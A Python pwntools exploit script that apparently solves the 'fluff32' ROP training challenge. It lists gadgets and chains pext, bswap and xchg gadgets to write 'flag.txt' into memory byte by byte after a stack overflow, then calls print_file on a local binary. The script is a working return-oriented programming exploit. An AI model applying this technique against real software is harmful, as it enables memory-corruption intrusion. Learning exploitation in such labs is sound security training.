'''
interesting gadgets:

0x080485bb                 5d  pop ebp
0x080485bc                 c3  ret

0x08048543      89e8           mov eax, ebp
0x08048545      bbbababab0     mov ebx, 0xb0bababa
0x0804854a      c4e262f5d0     pext edx, ebx, eax
0x0804854f      b8efbeadde     mov eax, 0xdeadbeef
0x08048554      c3             ret

; push big endian target on stack
0x08048558      59             pop ecx
0x08048559      0fc9           bswap ecx
0x0804855b      c3             ret

; swap, ts our write primitive
0x08048555      8611           xchg byte [ecx], dl
0x08048557      c3             ret
'''

from pwn import *


def construct_mask(coo: byte) -> int:
    # you idiot, it's dest, src, mask
    mask = 0
    src = 0xb0bababa # this is all I care about
    bit_offset = 14 # imma ignore 0xba altogether
    # 10110000 10111010 10111010 10111010
    for bit_idx in range(8):
        needed = (ord(coo) >> bit_idx) & 1
        while bit_offset < 32 and ((src >> bit_offset) & 1) != needed:
            bit_offset += 1
        mask |= (1 << bit_offset)
        bit_offset += 1
    return mask

def write_char_to_dest(c, loc_offset) -> bytes:
    _payload = p32(pop_ebp) + p32(construct_mask(c)) + p32(ld_byte)
    _payload += p32(pop_ecx_big) + p32(dest+loc_offset, endian='big') + p32(write)
    return _payload
    

p = process("./fluff32")

offset = 0x28 + 0x4

pop_ebp = 0x080485bb
pop_ecx_big = 0x08048558
ld_byte = 0x08048543 # use this with construct mask

write = 0x08048555

dest = 0x0804a018
print_file = 0x08048538

payload = b'E'*offset
payload += write_char_to_dest(b'f', 0)
payload += write_char_to_dest(b'l', 1)
payload += write_char_to_dest(b'a', 2)
payload += write_char_to_dest(b'g', 3)
payload += write_char_to_dest(b'.', 4)
payload += write_char_to_dest(b't', 5)
payload += write_char_to_dest(b'x', 6)
payload += write_char_to_dest(b't', 7)

payload += p32(print_file) + p32(dest) + p32(dest)

with open("payload.bin", 'wb') as f:
    f.write(payload)

# interactive part
p.recvuntil(b">")
p.sendline(payload)

p.interactive()
